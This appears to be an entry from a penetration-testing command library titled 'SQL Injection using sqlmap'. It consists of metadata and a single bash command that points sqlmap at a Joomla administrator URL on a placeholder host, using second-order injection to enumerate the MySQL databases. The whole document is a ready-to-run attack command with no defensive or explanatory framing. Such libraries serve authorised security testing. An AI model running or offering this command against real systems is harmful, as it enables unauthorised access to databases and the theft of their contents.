---
id: 613ca210-785b-4e21-9542-c49f852d3a12
name: SQL Injection using sqlmap
type: command
executor: bash
data: sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php"
  -D "joomla" -dbs
output: null
created_at: '2023-04-06T03:56:36.339078+00:00'
updated_at: '2023-04-10T20:24:23.701868+00:00'
---

# SQL Injection using sqlmap

```bash
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
